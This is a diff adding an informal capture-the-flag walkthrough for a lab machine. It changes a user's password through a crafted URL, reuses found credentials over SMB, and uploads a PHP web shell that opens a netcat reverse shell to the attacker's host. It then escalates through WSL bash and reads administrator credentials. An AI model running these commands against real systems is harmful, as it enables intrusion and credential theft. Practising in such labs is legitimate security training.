@@ -1,0 +1,53 @@
+first we have to register then we found username 
+
+tyler 
+
+we sent some xss script to tyler 
+
+http://10.10.10.97/change_pass.php?password=asd123&confirm_password=asd123&submit=submit
+
+tyler password is changed to asd123
+
+
+i found some pwd in notes
+
+tyler / 92g!mA8BGjOirkL%OG*&
+
+
+smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
+
+
+smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' \\\\10.10.10.97\\new-site
+
+
+new port open 8808
+
+
+im uploading shel file using smb
+
+10.10.10.97:8808/shel.php?innovative=nc 10.10.12.188 1234  -e powershell
+
+nc -lnvp 1234
+ 
+
+i got shell
+
+i got user.txt 
+
+i found bash.lnk
+
+i think its have linux too 
+
+i have to find bash using this cmd     dir bash.exe /s /p
+
+
+i just execute this line in shell  C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+
+i got root shell then i run 
+
+
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+
+then i found .bash_history 
+
+i got some smbclient admin access
